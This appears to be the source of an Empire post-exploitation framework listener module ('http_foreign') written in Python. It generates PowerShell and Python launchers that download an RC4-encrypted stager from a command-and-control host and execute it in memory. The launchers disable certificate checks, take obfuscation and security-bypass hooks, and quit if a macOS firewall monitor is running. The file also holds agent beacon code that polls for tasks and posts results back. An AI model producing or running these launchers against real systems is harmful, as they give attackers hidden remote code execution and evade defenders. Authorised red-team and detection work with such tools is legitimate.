import base64
import logging
import random
from builtins import object, str
from typing import List, Optional, Tuple

from empire.server.common import helpers, packets
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_validate_message

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "HTTP[S]",
            "Authors": ["@harmj0y"],
            "Description": ("Starts a 'foreign' http[s] Empire listener."),
            "Category": ("client_server"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_foreign",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "http://%s" % (helpers.lhost()),
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 5,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self) -> Tuple[bool, Optional[str]]:
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error(
                "listeners/http_foreign generate_launcher(): no language specified!"
            )
            return None

        # Previously, we had to do a lookup for the listener and check through threads on the instance.
        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
        if (
            True
        ):  # The true check is just here to keep the indentation consistent with the old code.
            active_listener = self
            # extract the set options for this instantiated listener
            listenerOptions = active_listener.options

            host = listenerOptions["Host"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            stagingKey = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            uris = [a for a in profile.split("|")[0].split(",")]
            stage0 = random.choice(uris)
            customHeaders = profile.split("|")[2:]

            if language.startswith("po"):
                # PowerShell

                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if "https" in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != "none" or proxy.lower() != "none":

                    if userAgent.lower() != "none":
                        stager += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            # TODO: implement form for other proxy
                            stager += "$proxy=New-Object Net.WebProxy;"
                            stager += f"$proxy.Address = '{ proxy.lower() }';"
                            stager += "$wc.Proxy = $proxy;"

                        if proxyCreds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            domain = username.split("\\")[0]
                            usr = username.split("\\")[1]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
                            stager += f"$wc.Proxy.Credentials = $netcred;"

                # TODO: reimplement stager retries?

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]
                        stager += f'$wc.Headers.Add("{ headerKey }","{ headerValue }");'

                # code to turn the key string into a byte array
                stager += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
                )

                # this is the minimized RC4 stager code from rc4.ps1
                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a cookie
                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket.decode("UTF-8") }");'

                stager += f"$ser= { data_util.obfuscate_call_home_address(host) };$t='{ stage0 }';"
                stager += "$data=$wc.DownloadData($ser+$t);"
                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

                # decode everything and kick it over to IEX to kick off execution
                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith("py"):
                # Python

                launcherBase = "import sys;"
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += "import re, subprocess;"
                        launcherBase += (
                            'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
                        )
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                        launcherBase += "out, err = ps.communicate()\n"
                        launcherBase += (
                            "if re.search(\"Little Snitch\", out.decode('UTF-8')):\n"
                        )
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
                    log.error(p, exc_info=True)

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]

                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

                # add the RC4 packet to a cookie
                launcherBase += (
                    'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
                    % (b64RoutingPacket)
                )
                launcherBase += "import urllib.request\n"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(":")[0]
                        launcherBase += (
                            "proxy = urllib.request.ProxyHandler({'"
                            + proto
                            + "':'"
                            + proxy
                            + "'});\n"
                        )

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += (
                                "proxy_auth_handler.add_password(None,'"
                                + proxy
                                + "','"
                                + username
                                + "','"
                                + password
                                + "');\n"
                            )
                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener();\n"

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o);\n"
                # download the stager and extract the IV
                launcherBase += "a=o.open(server+t).read();"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=list(range(256)),0,[]\n"
                launcherBase += "for i in list(range(256)):\n"
                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(
                        launcherBase.encode("UTF-8")
                    ).decode("UTF-8")
                    if isinstance(launchEncoded, bytes):
                        launchEncoded = launchEncoded.decode("UTF-8")
                    launcher = (
                        "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
                        % (launchEncoded)
                    )
                    return launcher
                else:
                    return launcherBase

            else:
                log.error(
                    "listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
                )

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscationCommand="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        log.error("generate_stager() not implemented for listeners/template")
        return ""

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        log.error("generate_agent() not implemented for listeners/template")
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == "powershell":

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (
                    listenerOptions["Host"]["Value"]
                )

                getTask = (
                    """
                    $script:GetTask = {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $"""
                    + helpers.generate_random_script_var_name("RoutingPacket")
                    + """ = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($"""
                    + helpers.generate_random_script_var_name("RoutingPacket")
                    + """)

                                # build the web request object
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """ = New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Headers.Add($_.Name, $_.Value)}
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Headers.Add("Cookie", "session=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """
                )

                sendMessage = (
                    """
                    $script:SendMessage = {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $"""
                    + helpers.generate_random_script_var_name("RoutingPacket")
                    + """ = New-RoutingPacket -EncData $EncBytes -Meta 5

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                # build the web request object
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """ = New-Object System.Net.WebClient
                                # set the proxy settings for the WC to be the default system settings
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.Headers.Add($_.Name, $_.Value)}

                                try{
                                    # get a random posting URI
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $"""
                    + helpers.generate_random_script_var_name("wc")
                    + """.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $"""
                    + helpers.generate_random_script_var_name("RoutingPacket")
                    + """);
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                        # restart key negotiation
                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
                                    }
                                }
                            }
                        }
                    }
                """
                )

                return updateServers + getTask + sendMessage

            elif language.lower() == "python":

                updateServers = "server = '%s'\n" % (listenerOptions["Host"]["Value"])

                # Import sockschain code
                f = open(
                    self.mainMenu.installPath
                    + "/data/agent/stagers/common/sockschain.py"
                )
                socks_import = f.read()
                f.close()

                sendMessage = f"""
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.
    global missedCheckins
    global server
    global headers
    global taskURIs
    data = None
    if packets:
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, packets)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)

    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        wrapmodule(urllib.request)
        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib.request.HTTPError as HTTPError:
        # if the server is reached, but returns an error (like 404)
        missedCheckins = missedCheckins + 1
        #if signaled for restaging, exit.
        if HTTPError.code == 401:
            sys.exit(0)

        return (HTTPError.code, '')

    except urllib.request.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')
    return ('', '')
"""

                return socks_import + updateServers + sendMessage

            else:
                log.error(
                    "listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
                )
        else:
            log.error("listeners/http_foreign generate_comms(): no language specified!")

    def start(self, name=""):
        """
        Nothing to actually start for a foreign listner.
        """
        return True

    def shutdown(self, name=""):
        """
        Nothing to actually shut down for a foreign listner.
        """
        pass
